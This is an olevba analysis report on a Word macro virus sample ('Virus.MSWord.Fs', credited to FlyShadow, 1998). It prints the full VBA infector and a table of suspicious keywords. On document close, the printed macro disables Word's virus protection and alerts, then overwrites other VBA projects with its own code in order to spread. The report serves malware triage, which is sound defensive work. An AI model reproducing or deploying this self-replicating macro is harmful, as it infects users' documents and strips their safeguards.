olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Fs
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Fs - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

'Copyright (C) 1998 by FlyShadow ~^^~ - 17th
Private Sub Document_Close()
On Error Resume Next
Options.VirusProtection = 0
Options.SaveNormalPrompt = 0
Application.DisplayAlerts = 0
Application.ScreenUpdating = 0
Application.EnableCancelKey = 0
Set Ј\ = VBE.VBProjects
For Јd = 1 To Ј \ .Count
If Ј\(Јd).Protection <> 1 And Ј\(Јd).Description <> "17th" Then
Ј\(Јd).Description = "17th"
Set Јo = Ј\(Јd).VBComponents(1).CodeModule
Јo.DeleteLines 1, Јo.CountOfLines
Јo.AddFromString VBProject.VBComponents(1).CodeModule.Lines(1, 17)
End If: Next
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

